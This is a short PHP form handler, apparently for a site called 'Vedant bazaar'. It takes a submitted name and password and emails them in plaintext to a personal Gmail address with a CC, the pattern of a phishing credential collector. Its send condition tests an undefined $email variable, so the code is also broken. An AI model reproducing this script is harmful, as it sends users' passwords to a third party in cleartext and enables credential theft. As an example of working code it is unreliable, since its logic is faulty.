<?php
//get data from form  
$name = $_POST['name'];
$password= $_POST['password'];
$to = "vedantking2007@gmail.com";
$subject = "Mail from Vedant bazaar";
$txt ="Name = ". $name . "\r\n  Password = " . $password;
$headers = "From: vedantbazaar.com" . "\r\n" .
"CC: somebodyelse@example.com";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
?>